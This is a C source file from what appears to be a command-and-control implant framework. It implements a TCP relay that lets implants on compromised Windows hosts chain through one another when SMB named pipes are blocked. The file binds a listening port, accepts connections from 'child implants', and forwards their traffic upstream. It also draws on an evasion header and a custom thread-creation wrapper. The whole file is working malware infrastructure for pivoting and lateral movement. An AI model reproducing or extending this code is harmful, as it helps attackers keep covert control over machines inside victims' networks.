/**
 * tcp_pivot.c - TCP P2P relay for implant chaining
 *
 * Similar to pipe.c but uses raw TCP sockets for environments where
 * SMB named pipes are blocked or undesirable. The relay implant binds
 * a TCP port and child implants connect to it.
 */
#ifdef _WIN32

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include "../../include/config.h"
#include "../../include/pivot.h"
#include "../../include/p2p_relay.h"
#include "../../include/evasion.h"

#pragma comment(lib, "ws2_32.lib")

#define MAX_TCP_P2P 8

typedef struct {
    SOCKET sock;
    HANDLE thread;
    BOOL   active;
} TCP_P2P_CONN;

static TCP_P2P_CONN g_tcp_p2p[MAX_TCP_P2P];
static SOCKET g_tcp_listen_sock = INVALID_SOCKET;
static HANDLE g_tcp_listen_thread = NULL;
static BOOL   g_tcp_listening = FALSE;
static WORD   g_tcp_listen_port = 0;

static DWORD WINAPI tcp_p2p_relay(LPVOID param) {
    TCP_P2P_CONN *conn = (TCP_P2P_CONN *)param;
    char buf[65536];

    while (conn->active) {
        int n = recv(conn->sock, buf, sizeof(buf), 0);
        if (n <= 0) break;
        p2p_relay_process(INVALID_HANDLE_VALUE, conn->sock, P2P_TRANSPORT_TCP,
                          (const BYTE *)buf, (DWORD)n);
    }

    closesocket(conn->sock);
    conn->sock = INVALID_SOCKET;
    conn->active = FALSE;
    return 0;
}

static DWORD WINAPI tcp_p2p_accept(LPVOID param) {
    (void)param;

    while (g_tcp_listening) {
        struct sockaddr_in client;
        int len = sizeof(client);
        SOCKET s = accept(g_tcp_listen_sock, (struct sockaddr*)&client, &len);
        if (s == INVALID_SOCKET) {
            if (!g_tcp_listening) break;
            Sleep(100);
            continue;
        }

        int slot = -1;
        for (int i = 0; i < MAX_TCP_P2P; i++) {
            if (!g_tcp_p2p[i].active) {
                slot = i;
                break;
            }
        }

        if (slot >= 0) {
            g_tcp_p2p[slot].sock = s;
            g_tcp_p2p[slot].active = TRUE;
            g_tcp_p2p[slot].thread = jager_create_thread(NULL, 0, tcp_p2p_relay, &g_tcp_p2p[slot], 0, NULL);
        } else {
            closesocket(s);
        }
    }
    return 0;
}

BOOL tcp_pivot_listen(WORD port) {
    if (g_tcp_listening) return TRUE;

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    g_tcp_listen_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (g_tcp_listen_sock == INVALID_SOCKET) return FALSE;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    if (bind(g_tcp_listen_sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        closesocket(g_tcp_listen_sock);
        return FALSE;
    }

    if (listen(g_tcp_listen_sock, MAX_TCP_P2P) != 0) {
        closesocket(g_tcp_listen_sock);
        return FALSE;
    }

    g_tcp_listen_port = port;
    g_tcp_listening = TRUE;
    memset(g_tcp_p2p, 0, sizeof(g_tcp_p2p));
    g_tcp_listen_thread = jager_create_thread(NULL, 0, tcp_p2p_accept, NULL, 0, NULL);
    return g_tcp_listen_thread != NULL;
}

BOOL tcp_pivot_connect(const char *host, WORD port) {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return FALSE;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(host);
    addr.sin_port = htons(port);

    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        closesocket(s);
        return FALSE;
    }

    int slot = -1;
    for (int i = 0; i < MAX_TCP_P2P; i++) {
        if (!g_tcp_p2p[i].active) {
            slot = i;
            break;
        }
    }

    if (slot < 0) {
        closesocket(s);
        return FALSE;
    }

    g_tcp_p2p[slot].sock = s;
    g_tcp_p2p[slot].active = TRUE;
    p2p_relay_set_upstream(INVALID_HANDLE_VALUE, s, P2P_TRANSPORT_TCP);
    g_tcp_p2p[slot].thread = jager_create_thread(NULL, 0, tcp_p2p_relay, &g_tcp_p2p[slot], 0, NULL);
    return TRUE;
}

#else
/* Non-Windows stub */
#include "../../include/pivot.h"
BOOL tcp_pivot_listen(unsigned short port) { (void)port; return 0; }
BOOL tcp_pivot_connect(const char *host, unsigned short port) {
    (void)host; (void)port; return 0;
}
#endif
